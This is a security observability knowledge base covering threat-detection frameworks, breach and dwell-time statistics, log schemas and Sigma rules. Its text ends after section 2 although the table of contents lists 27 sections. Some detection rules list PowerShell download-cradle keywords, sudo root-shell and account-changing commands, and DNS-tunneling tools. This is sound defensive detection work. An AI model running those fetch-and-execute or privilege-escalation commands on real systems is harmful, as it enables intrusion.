# Security Observability Deep Dive

> Comprehensive consulting knowledge base covering security observability fundamentals, threat detection (log-based, network, identity, endpoint), SIEM platforms (Splunk, Elastic, Sentinel, Chronicle), SOAR automation, cloud security (AWS/Azure/GCP), container and Kubernetes security, SOC operations, incident response, compliance monitoring (PCI-DSS 4.0, HIPAA, SOX, GDPR, SOC 2, NIST 800-53, ISO 27001, FedRAMP), OpenTelemetry for security, application and data security, architecture patterns, and emerging trends (AI/ML, XDR, CNAPP, eBPF).

---

## Table of Contents

### Part I: Foundations and Threat Detection
1. [Security Observability Fundamentals](#1-security-observability-fundamentals)
2. [Log-Based Threat Detection](#2-log-based-threat-detection)
3. [Network Security Observability](#3-network-security-observability)
4. [Identity and Access Monitoring](#4-identity-and-access-monitoring)
5. [Endpoint Security Observability](#5-endpoint-security-observability)

### Part II: SIEM, SOAR, and Cloud Security
6. [SIEM Architecture and Fundamentals](#1-siem-architecture-and-fundamentals)
7. [Splunk Enterprise Security](#2-splunk-enterprise-security)
8. [Elastic Security](#3-elastic-security)
9. [Microsoft Sentinel](#4-microsoft-sentinel)
10. [Google Chronicle SIEM](#5-google-chronicle-siem)
11. [Sumo Logic Cloud SIEM](#6-sumo-logic-cloud-siem)
12. [SIEM Platform Comparison](#7-siem-platform-comparison-matrix)
13. [Open Source SIEM Alternatives](#8-open-source-siem-alternatives)
14. [SOAR Architecture and Platforms](#9-soar-architecture-and-platforms)
15. [AWS Security Observability](#10-aws-security-observability)
16. [Azure Security Observability](#11-azure-security-observability)
17. [GCP Security Observability](#12-gcp-security-observability)
18. [Container and Kubernetes Security](#13-container-and-kubernetes-security-observability)
19. [Supply Chain Security](#14-supply-chain-security)

### Part III: Operations, Compliance, and Architecture
20. [SOC Observability and Metrics](#1-soc-observability-and-metrics)
21. [Incident Response Observability](#2-incident-response-observability)
22. [Compliance and Audit Observability](#3-compliance-and-audit-observability)
23. [OpenTelemetry for Security](#4-opentelemetry-for-security)
24. [Application Security Observability](#5-application-security-observability)
25. [Data Security Observability](#6-data-security-observability)
26. [Security Observability Architecture](#7-security-observability-architecture)
27. [Emerging Trends](#8-emerging-trends)

---


# Part I: Foundations and Threat Detection

---

## 1. Security Observability Fundamentals

### 1.1 Defining Security Observability

**Security Observability** is the ability to infer the security state of a system from its external outputs -- logs, metrics, traces, network flows, and behavioral signals -- enabling continuous detection, investigation, and response to threats in real time.

| Dimension | Traditional Security Monitoring | SIEM | Security Observability |
|---|---|---|---|
| **Approach** | Rule-based, perimeter-focused | Log aggregation + correlation rules | Telemetry-driven, full-stack visibility |
| **Data model** | Alerts from point tools (FW, IDS, AV) | Normalized logs, predefined parsers | Structured telemetry: logs + metrics + traces + flows |
| **Detection** | Signature/threshold-based | Correlation rules, saved searches | Behavioral analytics, ML anomaly detection, detection-as-code |
| **Investigation** | Manual log review, pivot across tools | Search + dashboards within SIEM | Distributed tracing across security domains, entity timelines |
| **Response** | Ticket-based, manual | SOAR playbooks | Automated response integrated with observability pipeline |
| **Coverage** | North-south (perimeter) | Log sources configured | East-west, north-south, cloud control plane, identity, application layer |
| **Cost model** | Per-device licensing | Per-GB ingestion | Signal-based: filter, sample, route by value |
| **Limitations** | Blind to lateral movement, cloud-native attacks | Alert fatigue, schema rigidity, cost at scale | Requires telemetry instrumentation, cultural shift |

**Key distinction**: Traditional monitoring asks "Is this known-bad?" SIEM asks "Do these logs correlate to something bad?" Security observability asks "Can I understand what is happening across my entire environment well enough to detect the unknown?"

### 1.2 The Shift: Perimeter Security to Zero Trust Observability

The traditional "castle and moat" security model assumed that threats came from outside a hardened perimeter. Modern environments have dissolved that perimeter:

```
Traditional Perimeter Model (pre-2015):
+----------------------------------+
|         Corporate Network        |
|  +--------+  +--------+         |
|  |Server  |  |Server  | TRUSTED |
|  +--------+  +--------+         |
|         +----------+             |
|         |Firewall  |<--- Single enforcement point
|         +----------+             |
+----------------------------------+
           |
     UNTRUSTED (Internet)

Zero Trust Observability Model (2024+):
+----------------------------------------------+
|  Every request verified, every signal observed|
|                                              |
|  +----------+   +----------+   +-----------+ |
|  |Identity  |-->| Policy   |-->| Resource  | |
|  | Signal   |   | Engine   |   | Access    | |
|  +----------+   +----------+   +-----------+ |
|       |              |              |         |
|       v              v              v         |
|  +------------------------------------------+|
|  |   Continuous Observability Pipeline       ||
|  |  (logs + metrics + traces + flows)        ||
|  +------------------------------------------+|
+----------------------------------------------+
```

**Zero Trust observability signals:**

| Signal Category | Examples | Purpose |
|---|---|---|
| **Identity signals** | Auth logs, MFA status, token validity, session behavior | Continuous identity verification |
| **Device signals** | Patch level, EDR status, compliance posture, certificate validity | Device trust assessment |
| **Network signals** | Flow metadata, DNS queries, TLS fingerprints, lateral movement patterns | Network trust verification |
| **Application signals** | API call patterns, data access patterns, error rates, trace anomalies | Workload behavior verification |
| **Data signals** | DLP events, encryption status, classification labels, access frequency | Data-centric security |
| **Context signals** | Geolocation, time-of-day, risk score, threat intelligence enrichment | Adaptive policy decisions |

### 1.3 Security Observability Pillars

```
                    +---------------------+
                    |   SECURITY          |
                    |   OBSERVABILITY     |
                    +----------+----------+
         +--------------+------+------+--------------+
         v              v            v               v
    +---------+  +-----------+  +---------+  +----------+
    |DETECTION|  |INVESTIGA- |  |RESPONSE |  |COMPLIANCE|
    |         |  |TION       |  |         |  |          |
    |Real-time|  |Root cause |  |Contain  |  |Audit     |
    |alerting |  |analysis   |  |Eradicate|  |Evidence  |
    |Anomaly  |  |Timeline   |  |Recover  |  |Reporting |
    |detection|  |reconstrc  |  |Automate |  |Continuous|
    |Threat   |  |Entity     |  |Playbooks|  |monitoring|
    |hunting  |  |graphing   |  |SOAR     |  |Posture   |
    +---------+  +-----------+  +---------+  +----------+
```

**Detection**: Identifying threats through real-time analysis of telemetry signals. Includes signature-based detection (known threats), anomaly detection (deviations from baselines), and threat hunting (hypothesis-driven investigation).

**Investigation**: Determining scope, impact, and root cause. Requires entity-centric timelines, distributed trace correlation, and the ability to pivot across data sources (logs to network flows to identity events).

**Response**: Containing threats and restoring normal operations. Ranges from manual incident response to automated SOAR playbooks triggered by observability signals.

**Compliance**: Demonstrating security posture through continuous monitoring, audit trails, and evidence generation. Maps to regulatory requirements (SOC 2, PCI DSS, HIPAA, GDPR).

### 1.4 MITRE ATT&CK Framework and Observability Mapping

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. As of version 18.1 (December 2025), it contains 14 tactics, 201 techniques, and 424 sub-techniques for Enterprise.

**Tactics mapped to observability data sources:**

| Tactic | ID | Description | Key Observability Data Sources |
|---|---|---|---|
| **Reconnaissance** | TA0043 | Gathering target information | Network flow logs, DNS logs, web server access logs |
| **Resource Development** | TA0042 | Establishing attack infrastructure | Threat intelligence feeds, certificate transparency logs |
| **Initial Access** | TA0001 | Gaining entry to the network | Email gateway logs, web proxy logs, VPN auth logs, cloud audit logs |
| **Execution** | TA0002 | Running malicious code | Process creation logs (Sysmon EID 1), PowerShell logs (EID 4104), WMI logs |
| **Persistence** | TA0003 | Maintaining foothold | Registry changes (Sysmon EID 12/13), scheduled tasks, service creation, startup items |
| **Privilege Escalation** | TA0004 | Gaining higher permissions | Windows Security EID 4672/4673, sudo logs, token manipulation events |
| **Defense Evasion** | TA0005 | Avoiding detection | Process injection (Sysmon EID 8/10), file deletion, log clearing (EID 1102) |
| **Credential Access** | TA0006 | Stealing credentials | LSASS access (Sysmon EID 10), Kerberos events (EID 4768/4769), auth failures |
| **Discovery** | TA0007 | Exploring the environment | LDAP queries, network scanning (flow data), command-line recon tools |
| **Lateral Movement** | TA0008 | Moving through network | Remote login events (EID 4624 type 3/10), SMB traffic, RDP sessions, PsExec |
| **Collection** | TA0009 | Gathering target data | File access logs, database query logs, clipboard events, screen capture |
| **Command and Control** | TA0011 | Communicating with compromised systems | DNS anomalies, HTTP beaconing patterns, encrypted tunnel detection, JA3/JA4 |
| **Exfiltration** | TA0010 | Stealing data | DLP events, unusual outbound volume, DNS tunneling, cloud storage uploads |
| **Impact** | TA0040 | Disrupting operations | Ransomware indicators, data destruction, service stop events, defacement |

**Detection coverage example -- mapping observability to T1059 (Command and Scripting Interpreter):**

```yaml
# Sigma rule: Suspicious PowerShell Command Line (T1059.001)
title: Suspicious PowerShell Download Cradle
id: 6e897e4b-3929-4c6b-a9f8-5d9b3c2e1234
status: stable
description: Detects PowerShell download cradles commonly used for malware delivery
references:
    - https://attack.mitre.org/techniques/T1059/001/
author: OllyStack Security Research
date: 2025/01/15
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_commands:
        CommandLine|contains:
            - 'IEX'
            - 'Invoke-Expression'
            - 'Invoke-WebRequest'
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Start-BitsTransfer'
            - 'iwr '
            - 'curl '
            - 'wget '
    condition: selection_img and selection_commands
falsepositives:
    - Legitimate software installation scripts
    - System administration scripts
level: high
```

### 1.5 Lockheed Martin Cyber Kill Chain and Observability

The Cyber Kill Chain, developed by Lockheed Martin in 2011, describes seven stages an adversary must complete for a successful intrusion. Stopping the attacker at any stage breaks the chain.

```
Stage              Observability Controls                    Key Data Sources
-----              ----------------------                    ----------------
1. Reconnaissance  * External scanning detection             Web server logs, DNS query logs,
                   * Port scan identification                NetFlow/IPFIX, honeypot alerts,
                   * OSINT monitoring                        threat intel feeds

2. Weaponization   * Threat intel on known malware           STIX/TAXII feeds, malware sandbox
                   * Sandbox detonation                      reports, VirusTotal integration,
                   * Vulnerability intelligence              CVE monitoring

3. Delivery        * Email gateway analysis                  Email logs, web proxy logs,
                   * URL/attachment scanning                 DNS logs, firewall logs,
                   * Drive-by download detection             IDS/IPS alerts (Suricata)

4. Exploitation    * Exploit attempt detection               Application logs, WAF logs,
                   * Vulnerability trigger monitoring        Sysmon EID 1 (process creation),
                   * Memory protection alerts                EDR telemetry, crash dumps

5. Installation    * Persistence mechanism detection         Registry (Sysmon EID 12/13),
                   * File integrity monitoring               scheduled tasks, service creation
                   * Dropper/implant identification          (EID 4697), FIM alerts, new files

6. Command &       * Beaconing detection                     DNS logs (tunneling), HTTP logs
   Control (C2)    * DNS anomaly analysis                    (beaconing), NetFlow, JA3/JA4
                   * Encrypted traffic analysis              fingerprints, proxy logs

7. Actions on      * Data exfiltration monitoring            DLP events, database audit logs,
   Objectives      * Lateral movement detection              file access logs, print/USB logs,
                   * Privilege abuse detection               cloud storage API logs
```

### 1.6 NIST Cybersecurity Framework (CSF 2.0) and Observability

Released February 26, 2024, NIST CSF 2.0 added a sixth function -- Govern -- to the original five. Observability plays a role in every function:

| CSF Function | ID | Observability Role | Key Activities |
|---|---|---|---|
| **Govern** | GV | Establish risk-informed telemetry strategy | Define what to observe, retention policies, compliance requirements, data classification |
| **Identify** | ID | Asset discovery, data flow mapping, risk assessment | Service dependency mapping via traces, asset inventory from telemetry, vulnerability correlation |
| **Protect** | PR | Verify protective controls are functioning | Monitor encryption status, verify access controls, validate patch deployment, configuration drift |
| **Detect** | DE | Core detection and continuous monitoring | Real-time alerting, anomaly detection, threat hunting, correlation rules, behavioral analytics |
| **Respond** | RS | Incident investigation and containment | Root cause analysis via traces, timeline reconstruction, automated containment playbooks |
| **Recover** | RC | Verify restoration and improvement | Service health dashboards, SLO monitoring during recovery, post-incident telemetry validation |

### 1.7 Diamond Model of Intrusion Analysis

The Diamond Model, proposed by Caltagirone, Pendergast, and Betz (2013), frames every intrusion event around four core features connected by relationships:

```
                    +------------+
                    | ADVERSARY  |
                    |            |
                    | Who?       |
                    | Attribution|
                    | Threat     |
                    | actor group|
                    +------+-----+
                           |
              uses         |         targets
         +-----------------+-----------------+
         |                 |                 |
         v                 |                 v
  +--------------+         |         +--------------+
  |INFRASTRUCTURE|         |         |   VICTIM     |
  |              |         |         |              |
  | C2 servers   |         |         | Organization |
  | Domains      |         |         | User         |
  | IP addresses |         |         | System       |
  | Email addrs  |         |         | Network      |
  +--------------+         |         +--------------+
         |                 |                 |
         +-----------------+-----------------+
                           |
                    +------+-----+
                    | CAPABILITY |
                    |            |
                    | Malware    |
                    | Exploits   |
                    | Tools      |
                    | TTPs       |
                    +------------+
```

**Core axiom**: "For every intrusion event, there exists an adversary taking a step toward an intended goal by using a capability over infrastructure against a victim to produce a result."

**Observability data sources for each vertex:**

| Vertex | Observability Sources | Enrichment |
|---|---|---|
| **Adversary** | Threat intel feeds, attribution reports, MISP indicators | STIX actor objects, campaign tracking |
| **Infrastructure** | DNS logs, passive DNS, certificate transparency, IP reputation | Whois data, ASN mapping, JA3/JA4 fingerprints |
| **Capability** | Malware sandbox results, Sigma rules, YARA matches, EDR detections | MITRE ATT&CK technique mapping, CVE correlation |
| **Victim** | Asset inventory, vulnerability scans, identity logs, application telemetry | Business context, data classification, criticality scoring |

### 1.8 Dwell Time Statistics (2024-2025)

Dwell time is the duration between initial compromise and detection. Shorter dwell times reduce breach impact.

**Mandiant M-Trends Data:**

| Year | Global Median Dwell Time | Internal Detection | External Notification | Ransomware Notification |
|---|---|---|---|---|
| 2022 | 16 days | -- | -- | -- |
| 2023 | 10 days | -- | -- | -- |
| 2024 | 11 days | 10 days | 26 days | 5 days |

Source: Mandiant M-Trends 2025 report.

**Key findings (M-Trends 2025):**
- 45.1% of investigations discovered within one week or less (up from 43.3% in 2023)
- Ransomware incidents have shortest dwell time (5 days median) because attackers self-notify via ransom demands
- External notification (26 days) remains significantly slower than internal detection (10 days), underscoring the value of robust internal detection capabilities
- The long-term trend is strongly downward: from 416 days in 2011 to 11 days in 2024

**Regional variation:**

| Region | Median Dwell Time (2024) |
|---|---|
| Americas | ~10 days |
| EMEA | ~13 days |
| APAC | ~9 days |

### 1.9 Cost of Breaches (IBM Cost of a Data Breach 2024-2025)

**IBM Cost of a Data Breach Report 2024:**
- Global average breach cost: **$4.88 million** (10% increase from 2023, largest spike since pandemic)
- Organizations using security AI/automation extensively saved **$2.2 million** per breach compared to those without

**IBM Cost of a Data Breach Report 2025:**
- US average breach cost jumped to **$10.22 million** (9% increase)
- Global average fell to **$4.44 million**

**Costs by industry (2024):**

| Industry | Avg. Breach Cost | vs. Global Average |
|---|---|---|
| Healthcare | $9.77 million | +100% (14th consecutive year as highest) |
| Financial services | $6.08 million | +22% |
| Industrial / Manufacturing | $5.56 million | +18% increase YoY |
| Technology | $5.45 million | +12% |
| Energy | $5.29 million | +8% |
| Pharmaceuticals | $5.10 million | +4% |

**Costs by initial attack vector (2024):**

| Attack Vector | % of Breaches | Avg. Cost | Avg. Time to Identify + Contain |
|---|---|---|---|
| Stolen/compromised credentials | 16% | $4.81M | ~292 days (longest) |
| Phishing | 16% | $4.88M | ~261 days |
| Cloud misconfiguration | 12% | $4.14M | ~252 days |
| Business email compromise | 10% | $5.01M | ~266 days |
| Zero-day exploit | 8% | $5.36M | ~271 days |

**Impact of detection method:**
- Organizations with security AI/automation: **$3.84M** average cost
- Organizations without security AI/automation: **$6.04M** average cost
- Savings: **$2.2 million** (36% reduction)

### 1.10 Security Observability Maturity Levels

Based on the SOC-CMM (SOC Capability Maturity Model), Elastic's DEBMM (Detection Engineering Behavior Maturity Model), and industry benchmarks:

```
Level 0: INITIAL / AD-HOC
  - No dedicated security monitoring
  - Reactive only -- respond to user reports or external notification
  - Logs exist but are not centrally collected
  - Mean Time to Detect (MTTD): weeks to months
  - Dwell time: 200+ days

Level 1: BASIC / REPEATABLE
  - Centralized log collection (SIEM deployed)
  - Vendor-provided detection rules (default content)
  - Basic alert triage process
  - Limited log sources (firewall, AV, maybe auth logs)
  - MTTD: days to weeks
  - Dwell time: 30-200 days

Level 2: DEFINED / PROACTIVE
  - Detection-as-code (Sigma rules in version control)
  - Multiple log sources: endpoint, network, identity, cloud
  - Alert tuning and false-positive reduction program
  - Threat intelligence integration (STIX/TAXII feeds)
  - Defined incident response playbooks
  - MTTD: hours to days
  - Dwell time: 7-30 days

Level 3: MANAGED / ADVANCED
  - Full telemetry stack: logs + metrics + traces + flows
  - UEBA and behavioral analytics deployed
  - Threat hunting program (hypothesis-driven)
  - Detection coverage mapped to MITRE ATT&CK
  - Automated response (SOAR integration)
  - Purple team exercises and detection validation
  - MTTD: minutes to hours
  - Dwell time: 1-7 days

Level 4: OPTIMIZING / PREDICTIVE
  - ML-driven anomaly detection across all telemetry
  - Continuous ATT&CK coverage measurement and gap analysis
  - Detection engineering lifecycle fully automated (CI/CD for detections)
  - Proactive threat modeling drives detection development
  - Autonomous SOC capabilities (AI triage, auto-investigation)
  - Business-risk-weighted alerting
  - MTTD: minutes
  - Dwell time: < 24 hours
```

**Industry distribution (2025):**
- Level 0-1: ~15% of organizations
- Level 2: ~33%
- Level 3: ~41%
- Level 4: ~11%

Source: SOC Maturity Report 2025, Anvilogic 2025 State of Detection Engineering Report.

---

## 2. Log-Based Threat Detection

### 2.1 Security-Relevant Log Sources

Comprehensive log collection is the foundation of threat detection. Each log source provides unique visibility:

```
+------------------+--------------------------------------------------+
|                    SECURITY LOG TAXONOMY                             |
+------------------+--------------------------------------------------+
| Authentication   | Windows Security (4624/4625), Linux auth.log,    |
| Logs             | LDAP bind events, RADIUS, SSO/SAML assertions,   |
|                  | MFA challenge/response, OAuth token grants        |
+------------------+--------------------------------------------------+
| Authorization    | File access (4663), object access (4656),         |
| Logs             | privilege use (4672/4673), sudo logs, RBAC         |
|                  | decisions, API authorization events               |
+------------------+--------------------------------------------------+
| Network Flow     | NetFlow v5/v9, IPFIX, sFlow, VPC Flow Logs,      |
| Logs             | NSG Flow Logs, firewall connection logs           |
+------------------+--------------------------------------------------+
| DNS Logs         | DNS server query logs, Zeek dns.log, passive      |
|                  | DNS, DNS RPZ logs, DoH/DoT resolver logs          |
+------------------+--------------------------------------------------+
| Proxy Logs       | HTTP/HTTPS proxy logs (Squid, Zscaler, Blue       |
|                  | Coat), URL categorization, SSL inspection logs    |
+------------------+--------------------------------------------------+
| Endpoint Logs    | Sysmon (Windows), auditd (Linux), ESF (macOS),    |
|                  | EDR telemetry, antivirus logs                     |
+------------------+--------------------------------------------------+
| Application Logs | Web server access/error logs, application          |
|                  | security events, WAF logs, API gateway logs       |
+------------------+--------------------------------------------------+
| Cloud Audit Logs | AWS CloudTrail, Azure Activity Log, GCP Cloud     |
|                  | Audit Logs, Kubernetes audit logs                 |
+------------------+--------------------------------------------------+
```

**Log volume benchmarks (per 1,000 employees/day):**

| Log Source | Estimated Daily Volume | Security Value |
|---|---|---|
| Windows Security Events | 50-200 GB | Critical (auth, privilege, object access) |
| DNS queries | 5-20 GB | High (C2, tunneling, DGA detection) |
| Network flows (NetFlow) | 10-50 GB | High (lateral movement, exfiltration) |
| Proxy/Web logs | 20-100 GB | High (malware delivery, C2 callbacks) |
| Endpoint (EDR/Sysmon) | 30-150 GB | Critical (process, file, registry, network) |
| Cloud audit logs | 5-30 GB | Critical (API abuse, misconfig, privilege escalation) |
| Application logs | 10-100 GB | Medium-High (application-layer attacks) |

### 2.2 Log Normalization and Enrichment

#### OCSF (Open Cybersecurity Schema Framework)

OCSF is an open-source, vendor-agnostic schema for security telemetry, developed collaboratively by AWS, Splunk, IBM, and others. As of version 1.3 (2025), it defines six categories and 63+ event classes:

**OCSF Categories:**

| Category | ID | Event Classes (examples) |
|---|---|---|
| **System Activity** | 1 | File Activity, Process Activity, Registry Activity, Kernel Activity |
| **Findings** | 2 | Security Finding, Vulnerability Finding, Compliance Finding |
| **Identity & Access** | 3 | Authentication, Authorization, Account Change, Group Management |
| **Network Activity** | 4 | Network Activity, DNS Activity, HTTP Activity, SSH Activity, RDP Activity |
| **Discovery** | 5 | Device Inventory, User Inventory, Configuration State |
| **Application Activity** | 6 | API Activity, Web Resource Activity, Datastore Activity |

**OCSF Authentication event example:**
```json
{
  "class_uid": 3002,
  "class_name": "Authentication",
  "category_uid": 3,
  "category_name": "Identity & Access Management",
  "activity_id": 1,
  "activity_name": "Logon",
  "severity_id": 1,
  "status_id": 2,
  "status": "Failure",
  "time": 1706745600000,
  "actor": {
    "user": {
      "name": "jsmith",
      "uid": "S-1-5-21-123456-1001",
      "type": "User"
    },
    "session": {
      "uid": "0x3E7"
    }
  },
  "src_endpoint": {
    "ip": "10.1.50.23",
    "hostname": "WORKSTATION-42"
  },
  "dst_endpoint": {
    "ip": "10.1.1.10",
    "hostname": "DC01.corp.local"
  },
  "auth_protocol": "Kerberos",
  "logon_type_id": 10,
  "logon_type": "RemoteInteractive",
  "metadata": {
    "product": {
      "name": "Windows Security",
      "vendor_name": "Microsoft"
    },
    "version": "1.3.0",
    "original_time": "2025-02-01T00:00:00Z"
  }
}
```

#### Elastic Common Schema (ECS)

ECS is a specification for structuring event data in Elasticsearch. Key field sets:

```
ECS Field Sets for Security:
  event.*          (action, category, kind, outcome, severity)
  source.*         (ip, port, domain, user, geo)
  destination.*    (ip, port, domain, user, geo)
  user.*           (name, id, domain, email, roles)
  process.*        (name, pid, command_line, parent.*, hash.*)
  file.*           (name, path, hash.*, size, extension)
  network.*        (transport, protocol, direction, bytes, packets)
  dns.*            (question.name, answers.*, response_code)
  tls.*            (version, cipher, client.ja3, server.ja3s)
  threat.*         (framework, tactic.*, technique.*)
  rule.*           (name, id, description, category)
```

#### Common Event Format (CEF)

CEF is a text-based log format widely used by security products (ArcSight, QRadar):

```
CEF:0|Security|Firewall|1.0|100|Connection Blocked|5|src=10.1.50.23
dst=203.0.113.50 spt=49832 dpt=443 proto=TCP act=blocked
reason=ThreatIntel msg=Known C2 server cs1Label=ThreatFeed
cs1=AlienVault-OTX
```

### 2.3 Sigma Rules: Syntax, Structure, and Examples

Sigma is the open standard for writing detection rules in a vendor-agnostic format. Rules are written in YAML and can be compiled to any SIEM query language.

**Sigma rule structure:**
```yaml
title: <Brief descriptive title>           # Required
id: <UUID v4>                              # Required (unique identifier)
related:                                    # Optional (links to other rules)
    - id: <UUID>
      type: derived | obsoletes | merged | renamed | similar
status: test | stable | experimental       # Required
description: <Detailed description>         # Required
references:                                 # Optional (URLs)
    - https://example.com
author: <Name>                             # Required
date: YYYY/MM/DD                           # Required
modified: YYYY/MM/DD                       # Optional
tags:                                       # Required (ATT&CK mapping)
    - attack.tactic_name
    - attack.tXXXX.XXX
logsource:                                 # Required
    category: <log category>               # e.g., process_creation, firewall
    product: <product>                     # e.g., windows, linux, aws
    service: <service>                     # e.g., security, sysmon, cloudtrail
detection:                                 # Required
    selection_name:                        # Named selections
        FieldName: value
        FieldName|modifier:                # Modifiers: contains, endswith,
            - value1                       # startswith, re, all, base64
            - value2
    filter_name:                           # Named filters (exclusions)
        FieldName: value
    condition: selection_name and not filter_name   # Boolean logic
falsepositives:                            # Required (known FPs)
    - <Description of known false positive>
level: informational | low | medium | high | critical   # Required
```

**Example 1: Brute Force Detection**

```yaml
title: Multiple Failed Logins Followed by Successful Login
id: a1b2c3d4-5678-9012-abcd-ef1234567890
status: stable
description: |
    Detects potential brute force attack pattern where multiple failed
    authentication attempts are followed by a successful login from the
    same source, indicating credential guessing or password spraying.
references:
    - https://attack.mitre.org/techniques/T1110/
author: OllyStack Security Research
date: 2025/01/15
tags:
    - attack.credential_access
    - attack.t1110.001
    - attack.t1110.003
logsource:
    product: windows
    service: security
detection:
    selection_failures:
        EventID: 4625
    selection_success:
        EventID: 4624
        LogonType:
            - 2    # Interactive
            - 10   # RemoteInteractive
    timeframe: 5m
    condition: selection_failures | count(TargetUserName) by IpAddress > 10
falsepositives:
    - Legitimate users who forget passwords
    - Service accounts with expired credentials
    - Automated monitoring tools
level: medium
```

**Example 2: Lateral Movement via PsExec**

```yaml
title: PsExec Service Installation
id: b2c3d4e5-6789-0123-bcde-f12345678901
status: stable
description: |
    Detects the installation of the PsExec service (PSEXESVC) on a
    remote system, indicating potential lateral movement.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: OllyStack Security Research
date: 2025/01/15
tags:
    - attack.lateral_movement
    - attack.t1021.002
    - attack.execution
    - attack.t1569.002
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceName|contains:
            - 'PSEXESVC'
            - 'psexec'
    condition: selection
falsepositives:
    - Legitimate system administration using PsExec
    - IT management tools that use PsExec
level: high
```

**Example 3: Privilege Escalation via Sudo**

```yaml
title: Sudo Privilege Escalation to Root Shell
id: c3d4e5f6-7890-1234-cdef-123456789012
status: stable
description: |
    Detects suspicious sudo usage that may indicate privilege escalation,
    including sudo to root from unusual users or for sensitive commands.
references:
    - https://attack.mitre.org/techniques/T1548/003/
author: OllyStack Security Research
date: 2025/01/15
tags:
    - attack.privilege_escalation
    - attack.t1548.003
logsource:
    product: linux
    service: auth
detection:
    selection_sudo:
        - 'sudo:'
    selection_commands:
        |contains:
            - 'COMMAND=/bin/bash'
            - 'COMMAND=/bin/sh'
            - 'COMMAND=/usr/bin/passwd root'
            - 'COMMAND=/usr/sbin/useradd'
            - 'COMMAND=/usr/sbin/usermod'
            - 'COMMAND=/usr/bin/chattr'
            - 'COMMAND=/bin/chmod 4'
    condition: selection_sudo and selection_commands
falsepositives:
    - System administrators performing legitimate tasks
    - Automated configuration management (Ansible, Puppet)
level: high
```

**Example 4: Data Exfiltration via DNS Tunneling**

```yaml
title: Potential DNS Tunneling - High Volume TXT Queries
id: d4e5f6a7-8901-2345-defa-234567890123
status: stable
description: |
    Detects potential DNS tunneling by identifying unusually high volumes
    of TXT record queries to a single domain, which is a common pattern
    for DNS-based data exfiltration tools (iodine, dnscat2, Cobalt Strike).
references:
    - https://attack.mitre.org/techniques/T1048/
    - https://attack.mitre.org/techniques/T1071/004/
author: OllyStack Security Research
date: 2025/01/15
tags:
    - attack.exfiltration
    - attack.t1048
    - attack.command_and_control
    - attack.t1071.004
logsource:
    category: dns
detection:
    selection:
        query_type: 'TXT'
    condition: selection | count(query) by parent_domain > 100
    timeframe: 1h
falsepositives:
    - DKIM/SPF verification generating TXT lookups
    - Legitimate services using DNS TXT records (e.g., Let's Encrypt)
level: high
```

### 2.4 Detection Engineering Lifecycle

```
+----------+   +----------+   +----------+   +----------+   +----------+   +----------+
|HYPOTHESIS|-->|  RULE    |-->| TESTING  |-->|DEPLOYMENT|-->| TUNING   |-->|RETIREMENT|
|          |   |DEVELOPMNT|   |          |   |          |   |          |   |          |
|Threat    |   |Sigma rule|   |Unit tests|   |Staged    |   |FP review |   |Coverage  |
|model     |   |writing   |   |Replay    |   |rollout   |   |Threshold |   |replaced  |
|Intel     |   |MITRE map |   |against   |   |Alert     |   |adjust    |   |Deprecated|
|report    |   |Data src  |   |historical|   |routing   |   |Entity    |   |technique |
|Hunt      |   |validation|   |data      |   |Runbook   |   |exclusion |   |Merged    |
|finding   |   |Peer      |   |Red team  |   |created   |   |Severity  |   |into      |
|Purple    |   |review    |   |exercise  |   |Monitored |   |reclass   |   |composite |
|team      |   |Git PR    |   |Atomic    |   |Baseline  |   |Coverage  |   |rule      |
+----------+   +----------+   +----------+   +----------+   +----------+   +----------+
```

**Detection-as-code pipeline:**
```yaml
# .github/workflows/detection-pipeline.yml
name: Detection Rule CI/CD
on:
  pull_request:
    paths: ['detections/**/*.yml']
  push:
    branches: [main]
    paths: ['detections/**/*.yml']

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Validate Sigma syntax
        run: |
          pip install sigma-cli
          sigma check detections/

      - name: Verify MITRE ATT&CK tags
        run: |
          python scripts/validate_attack_tags.py detections/

      - name: Run detection unit tests
        run: |
          sigma test --test-dir tests/ detections/

      - name: Check for duplicate logic
        run: |
          python scripts/check_duplicates.py detections/

  deploy:
    needs: validate
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - name: Compile to SIEM format
        run: |
          sigma convert -t splunk detections/ -o output/splunk/
          sigma convert -t elasticsearch detections/ -o output/elastic/
          sigma convert -t microsoft365defender detections/ -o output/m365d/

      - name: Deploy to SIEM
        run: |
          python scripts/deploy_detections.py \
            --target ${{ vars.SIEM_TARGET }} \
            --rules output/${{ vars.SIEM_TARGET }}/
```

### 2.5 Alert Fatigue: Causes, Metrics, and Reduction

**The alert fatigue problem (2025 statistics):**
- Average SOC receives **~3,000 alerts per day**
- **63% of alerts go unaddressed** due to volume
- **45% of alerts are false positives** (industry average)
- Average analyst processes **25-30 alerts per shift**
- Time per alert triage: **15-30 minutes** (manual), **2-5 minutes** (with automation)

**Key metrics for measuring alert quality:**

| Metric | Formula | Target (Mature SOC) |
|---|---|---|
| **Alert-to-Incident Ratio** | Total Alerts / Confirmed Incidents | < 20:1 is poor; target 5:1 |
| **False Positive Rate** | False Positives / Total Alerts | < 10% |
| **Mean Time to Detect (MTTD)** | avg(Detection Time - Compromise Time) | < 1 hour |
| **Mean Time to Triage (MTTT)** | avg(Triage Complete - Alert Fired) | < 15 minutes |
| **Mean Time to Respond (MTTR)** | avg(Containment Time - Alert Fired) | < 4 hours |
| **Detection Coverage** | ATT&CK Techniques with Rules / Total Techniques | > 60% |
| **Alert Dismissal Rate** | Dismissed Without Action / Total Alerts | < 30% |

**Alert fatigue reduction strategies:**

1. **Detection tuning** -- Regularly review top-firing rules, add entity-based exclusions, adjust thresholds based on environment baselines
2. **Alert deduplication** -- Group related alerts into incidents; one compromised host may trigger 50 alerts that should be a single incident
3. **Risk-based scoring** -- Weight alerts by asset criticality, user privilege level, threat intel confidence, and behavioral context
4. **Tiered alerting** -- Route high-fidelity alerts to Tier 1 immediately; batch low-fidelity detections for threat hunting review
5. **Automation** -- Use SOAR to auto-enrich, auto-triage, and auto-close known-benign patterns
